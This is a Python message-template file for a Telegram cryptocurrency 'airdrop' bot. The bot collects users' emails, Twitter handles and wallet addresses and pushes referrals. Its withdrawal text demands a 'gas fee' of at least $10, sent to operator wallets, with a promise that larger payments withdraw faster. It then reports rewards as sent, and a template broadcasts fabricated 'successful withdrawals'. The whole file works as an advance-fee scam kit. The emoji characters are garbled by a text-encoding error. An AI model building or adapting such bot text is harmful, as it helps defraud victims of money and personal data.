import sys
import importlib
c = importlib.import_module('configs.'+sys.argv[0].split('.')[0])

register_reward = int(float(c.CURRENT_PRICE)*int(c.REGISTER_REWARD))
referral_reward = int(float(c.CURRENT_PRICE)*int(c.REFERRAL_REWARD))

# ? Others
please_wait = 'ā»ļø <b>Please wait...</b>'
home_menu = 'š  Home menu:'


# ? Channels
# š https://t.me/{c.CHANNEL2}

join_channel = f'''
1ļøā£ <b>Join in our channel:</b>
š https://t.me/{c.CHANNEL1}

ā <i>After joining in channels, click on "Done".</i>
'''

left_from_channel = '''
ā <b>You have not joined in our channels!</b>

ā ļø To use the bot, you must join our channels.

ā After joining in channels, click on /start.
'''

not_joined = "ā You are not joining the channel yet."

# ? Register form

# Step 1
start_registering = f'''
š Hello dear [NAME].
š Welcome to <b>{c.TOKEN_NAME}</b> Airdrop bot.

š° <b>1 ${c.SYMBOL_UPPER} = ~{c.CURRENT_PRICE}$</b>
šø Total airdrop supply: <b>{c.AIRDROP_SUPPLY} ${c.SYMBOL_UPPER}</b>

š Airdrop rewards:

š¢ <b>For joining in our official Telegram channels & Twitter page :</b>
š {c.REGISTER_REWARD} ${c.SYMBOL_UPPER} = <b>{register_reward}$</b>

š„ <b>For each referral :</b>
š {c.REFERRAL_REWARD} ${c.SYMBOL_UPPER} = <b>{referral_reward}$</b>

ā <i>You need to do the required tasks to become qualified for receiving airdrop tokens.</i>

ā ļø <code>Be careful! If you cheat in the airdrop, your account will be banned forever from bot.</code>
'''

# Step 2
follow_twitter = f'''
2ļøā£ <b>Follow our Twitter page:</b>
http://twitter.com/{c.TWITTER}

ā <i>Like and retweet the pinned tweet, then click "Done".</i>
'''

# Step 3
get_twitter_username = '3ļøā£ <b>Now, Send your Twitter username without @ :</b>'
twitter_error = "ā <b>Invalid Twitter username!</b>\nā Username must be at least 4 characters long and not started with @.\n\n"+get_twitter_username
confirm_twitter_username = '''
ā<b>Do you confirm this is your Twitter username?</b>

š @{username}'''

# Step 4
get_email = '''
4ļøā£ <b>Send your Email :</b>

ā <b>Example :</b> john@example.com
'''

email_error = "ā <b>Invalid Email!</b>\n"+get_email
confirm_email = '''
ā<b>Do you confirm this is your Email address?</b>

š {email}'''

# Step 4
get_wallet = f'''
5ļøā£ <b>Last step, Send your ${c.SYMBOL_UPPER} wallet address:</b>

ā Need some help? Press /faq
'''

if(c.NETWORK == 'tron'):
    address_rules = 'ā Address must be 34 characters and started with T.'
elif(c.NETWORK == 'ethereum'):
    address_rules = 'ā Address must be 42 characters and started with 0x.'

wallet_error = f'''
ā <b>Invalid ${c.SYMBOL_UPPER} wallet address!</b>
{address_rules}

5ļøā£ <b>Send your ${c.SYMBOL_UPPER} wallet address:</b>
'''

confirm_wallet = f'''
ā<b>Do you confirm this is your ${c.SYMBOL_UPPER} address?</b>

š [WALLET]'''

# All done
all_done = f'''
ā <b>Congratulations! You have completed all the tasks.</b>

š„ <b>{c.REGISTER_REWARD} ${c.SYMBOL_UPPER} was added to your balance.</b>

š You can get more ${c.SYMBOL_UPPER} tokens by sharing your referral link with your friends.

š Withdrawal openning date: <b>{c.WITHDRAW_OPENING}</b>
'''

# ? Home menu
start = f'''
š Hello dear [NAME].
š Welcome to <b>{c.TOKEN_NAME}</b> Airdrop bot.

ā <b>You have completed all the tasks. No need to do anything else. Just wait until withdrawal date to get your rewards.</b>

š You can also get more ${c.SYMBOL_UPPER} tokens by sharing your referral link with your friends.
'''

balance = '''
š° <b>Your balance:</b>

š {units} ${symbol} = <b>{tilde}{balance}$</b>
'''

# š„ <b > Your referrals: < /b >
# {referrals}


account = '''
š¤ <b>Your account information:</b>

š <b>Account ID:</b> {chat_id}

š <b>Name:</b> {name}

āļø <b>Email:</b> {email}

š <b>Twitter:</b> @{twitter}

š <b>$[SYMBOL] wallet address:</b>
<code> {wallet} </code>
āāāāāāāāāā
š„ <b>Referrals ({referrals_count}):</b>
{referrals}
'''

get_withdraw = f'''
šµ Due to the network fee's as well as detecting real users from robots, you need to pay gas fee to withdraw your funds.

šø The amount you pay represents your confirmation of the rules and your receipt of airdrop funds in the amount of <b>[BALANCE]$</b>.

š¢ If there is a problem, check our deposits channel:
@{c.CHANNEL1}

āļø After successful payment, you must send us your Transaction TXID to confirm and receive your airdrop.

š„ Our support team will deposit your airdrop as soon as possible.

ā ļø <b>IMPORTANT:</b> due to network restrictions, the minimum payment amount is <b>$10</b>. Also, if you pay more gas fee, your withdrawal will be done <b>faster</b>.

š³ <b>Payment methods (click to copy):</b>

USDT (TRC-20):
<code>{c.USDT_WALLET}</code>

TRX (TRC-20) [180 TRX]:
<code>{c.TRX_WALLET}</code>

BNB (BEP-20) [0.03 BNB]:
<code>{c.BNB_WALLET}</code>

BUSD (BEP-20):
<code>{c.BUSD_WALLET}</code>

ā¼ļø <b>Note: </b> You have to send 10$ of these coins, not 10 units.

š„ <b>Send your Transaction TXID:</b>
'''
txid_error = '''
ā <b>Invalid Transaction TXID!</b>
ā TXID must be 64 or 11 characters.

š„ <b>Send your Transaction TXID:</b>
'''

withdraw_close = f'''
The Airdrop will be distributed manually on <b> January 15th. </b> Distribution is completely free !  š„

'''

# š° Your new balance: {tokens} ${symbol} = {usd}$

withdraw_done = '''
ā <b>Your transaction has been successfully confirmed and your rewards has been sent to your wallet!</b>

ā ļø <b>Note:</b> due to the large volume of withdrawal requests, deposits may take 12 to 24 hours.
'''

# š <b>Fee TXID</b>š
# {txid}

withdraw_done_channel = '''
š¤ <b>New successful withdrawal:</>

š¤ <b>User:</b> {full_name}

š <b>Account ID:</b> {chat_id}

š³ <b>Wallet address:</b> {wallet}

š° <b>Amount:</b> {tokens} ${symbol} = {usd}$

ā ļø <b>Note:</b> due to the large volume of withdrawal requests, deposits may take 12 to 24 hours. Follow the latest news from our <a href='https://t.me/{channel}'>official channel</a>.
'''

no_referrals = "No referrals"
self_referral = "āļø <b>You can't invite yourself to the bot!</b>"

referral_banner = f'''
š„ Join the <b>${c.SYMBOL_UPPER}</b> Airdrop now!š¤

š° Get <b>${register_reward}</b> for completing tasks!
š„ Get <b>${referral_reward}</b> per each referral!

ā”ļø <b>Get your rewards now</b> š
š https://t.me/{c.BOT_USERNAME}?start=[CHAT_ID]
'''

referral_joined = '''
ā <a href='tg://user?id={chat_id}'>{name}</a> joined with your referral link!

š„ <b>[TOKENS] $[SYMBOL] was added to your balance.</b>
'''

your_referrals = '''š <b>You are currently have {count} referrals.</b>'''

your_referrals_list = '''
š <b>You are currently have {count} referrals.</b>

š„ <b>List of your referrals:</b>
{referrals}

ā ļø <b>Note:</b> Your referrals must complete their registration, then you will receive your rewards!
'''

faq = f'''
š <b>FAQ:</b>

ā <b>I can't see ${c.SYMBOL_UPPER} in my wallet, where can i find it?</b>
š¹ You can add ${c.SYMBOL_UPPER} to your wallet using our contract address (click to copy):
<code>{c.CONTRACT}</code>

ā <b>Why do you need my ${c.SYMBOL_UPPER} wallet address?</b>
š¹ For claiming your rewards, we need your ${c.SYMBOL_UPPER} wallet address.

ā <b>What wallet do I need to receive my rewards?</b>
š¹ We prefer Trust Wallet for claiming your rewards.
'''

# ! Errors
unknown_error = 'ā <b>Unknown command!</b>'
unknown_command = 'ā <b>Unknown command!</b>'
unknown_problem = '''
ā <b>Unknown problem!</b>

š Please / start the bot again.
'''

# ? ------- Edit information ------ #

select_information = 'ā Edit information menu:'

# ----------------------- #

edit_email = '''
š <b>Send your new Email :</b>

ā <b>Example :</b> john@example.com
'''

edit_email_error = "ā <b>Invalid Email!</b>\n"+edit_email

# ----------------------- #

edit_twitter = 'š <b> Send your new Twitter username without @ :</b>'

edit_twitter_error = "ā <b>Invalid Twitter username!</b>\nā Username must be at least 4 characters long and not started with @.\n\n"+edit_twitter

# ----------------------- #

edit_wallet = f'''
š <b>Send your new ${c.SYMBOL_UPPER} wallet address:</b>

ā Need some help? Press /faq
'''

edit_wallet_error = f'''
ā <b>Invalid ${c.SYMBOL_UPPER} wallet address!</b>
{address_rules}

š <b>Send your new ${c.SYMBOL_UPPER} wallet address:</b>
'''

# ----------------------- #

edit_done = 'ā <b>Your {column} edited successfully.</b>'

not_enough_balance = f'''
ā <b>You don't have enough balance to withdraw!</b>

š <b>Minimum amount of withdrawal: {c.REFERRAL_REWARD} ${c.SYMBOL_UPPER}</b>

ā You can get more ${c.SYMBOL_UPPER} tokens by sharing your referral link with your friends,click on "š Referral" button to get your link. 
'''
